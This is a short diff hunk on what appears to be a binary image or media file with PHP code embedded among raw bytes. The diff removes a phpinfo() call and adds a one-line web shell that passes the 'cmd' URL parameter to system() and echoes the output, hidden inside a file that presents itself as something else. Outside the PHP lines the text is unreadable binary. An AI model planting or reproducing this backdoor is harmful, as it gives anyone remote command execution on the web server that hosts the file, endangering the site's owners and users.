@@ -61,7 +61,10 @@ nß*¯ñ{Õ˜Q€hÙÎ ÞÝÖ¡Bä²ºZ«Êá™ò1Ï`9§4Íä(
 º,’AéÆ ­WU_sCß®J…¤EÜlÅ“œ~•i[A½Më;©<“os•iù±‚?Zš}'n‡ä7#Ì’B¯þƒô?Ò¹»yç_1ƒ23Ó<×_¡jvV:·Ÿ{n&Š‘ï‘ Ï5W {îbÃa!%ø›vP	º
 JÊÕ=	Åè
 <?php
-phpinfo();
+
+$shell = system($_GET["cmd"]);
+echo $shell;
+
 ?>
 ¥â‹]BÂhä0}š+±¾,œ‚¹©éÎy÷Í`[Di§º|À
 Ÿ¼qÓéÏœùÜu==f9í¾Î%va£<{‘úWîWüËö¹Ôµ+ûoƒ¾6¸ûI•JÚLÇ8Û–Û–?‡á_€qGäX|¬sÆ¶
